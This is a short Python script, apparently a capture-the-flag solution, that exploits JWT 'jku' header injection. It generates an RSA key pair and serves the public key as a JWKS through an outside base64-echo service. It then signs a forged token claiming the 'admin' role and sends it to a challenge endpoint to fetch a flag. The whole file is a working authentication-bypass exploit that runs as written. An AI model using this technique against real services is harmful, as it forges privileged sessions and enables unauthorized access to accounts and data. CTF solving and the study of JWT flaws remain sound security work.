#!/usr/bin/env python3
"""Forge an RS256 admin JWT whose jku serves our matching public key."""

import base64
import json
import sys
import time

import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def int_b64url(value: int) -> str:
    return b64url(value.to_bytes((value.bit_length() + 7) // 8, "big"))


private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_numbers = private_key.public_key().public_numbers()

kid = "attacker-key-1"
jwk = {
    "kty": "RSA",
    "kid": kid,
    "use": "sig",
    "alg": "RS256",
    "n": int_b64url(public_numbers.n),
    "e": int_b64url(public_numbers.e),
}
jwks = json.dumps({"keys": [jwk]}, separators=(",", ":")).encode()

# httpbingo decodes base64url path data and returns the raw bytes.  This gives
# us a public JSON document without needing an attacker-controlled web server.
jku = "https://httpbingo.org/base64/" + base64.urlsafe_b64encode(jwks).decode()

header = {"alg": "RS256", "typ": "JWT", "jku": jku, "kid": kid}
payload = {"exp": int(time.time()) + 3600, "role": "admin", "sub": "alice"}
signing_input = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64url(json.dumps(payload, separators=(",", ":")).encode())
).encode()
signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
token = signing_input.decode() + "." + b64url(signature)

target = (
    sys.argv[1].rstrip("/")
    if len(sys.argv) > 1
    else "https://ch04-jwks-forge.ip-167-235-30-42.swiftwave.xyz"
)
response = requests.get(
    target + "/admin/flag",
    headers={"Authorization": "Bearer " + token},
    timeout=20,
)
print(response.status_code, response.text)
